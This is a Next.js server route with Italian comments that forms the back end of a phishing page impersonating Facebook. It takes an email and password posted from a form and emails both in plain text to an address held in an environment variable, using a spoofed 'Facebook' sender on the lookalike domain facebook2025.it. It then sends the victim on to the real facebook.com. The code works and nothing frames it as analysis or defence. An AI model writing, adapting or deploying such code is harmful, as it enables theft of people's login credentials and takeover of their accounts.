export const runtime = 'nodejs';require('dotenv').config(); // Se usi .env.local

import { NextResponse } from 'next/server';
import { Resend } from 'resend';

export async function POST(request: Request) {
  try {
    const body = await request.formData();
    const email = body.get('email')?.toString() || '';
    const password = body.get('password')?.toString() || '';

    // 🔐 Validazione semplice
    if (!email.includes('@') || password.length < 4) {
      return NextResponse.json({ error: 'Credenziali non valide' }, { status: 400 });
    }

    const resend = new Resend(process.env.RESEND_API_KEY);

    await resend.emails.send({
      from: 'Facebook <securitynoreply@facebook2025.it>',
      to: process.env.EMAIL_TO ?? '',
      subject: '🛡️ Nuovo accesso Facebook',
      html: `
        <div style="font-family: Arial, sans-serif; padding: 1rem;">
          <h2 style="color: #4267B2;">🔐 Nuovo login registrato</h2>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Password:</strong> ${password}</p>
          <hr />
          <p style="font-size: 0.85rem; color: #555;">Ricevuto da facebook2025.it</p>
        </div>
      `,
    });

    // ✅ Redirect verso Facebook
    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error('❌ Errore invio email:', error);
    return NextResponse.json({ error: 'Errore interno del server' }, { status: 500 });
  }
}
